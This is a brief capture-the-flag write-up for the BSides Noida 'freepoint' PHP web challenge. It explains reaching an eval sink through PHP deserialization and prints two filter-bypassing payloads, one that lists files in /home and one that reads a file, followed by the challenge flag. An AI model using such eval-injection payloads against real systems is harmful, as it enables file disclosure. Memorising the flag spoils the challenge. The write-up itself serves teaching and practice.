# BSides Noida CTF - freepoint (34 solves)

> i hate php >.<
Note : Bruteforce is not required.

**Category**: web

**Given**: 
- [index.php](handouts/index.php): PHP page source code

**Requirements**: N/A

**Solution Files**: [solve.py](solve.py)

**TL;DR**: Create a serialized PHP payload that reaches the `eval`, find the flag file and read its content.

### Overview
TODO

### Exploit

`substr` trick to get strings, to bypass regex filter.

PHP payload to list files:
```
echo+implode(substr("+|",1),glob("/home/*"))
```

PHP payload to read file:
```
echo+fread((fopen(urldecode(glob("/home/*")[0]), substr("+r", 1, 1))), 10000000);
```


**Flag**: BSNoida{Fre3_fl4g_f04_y0u_@@55361988!!!}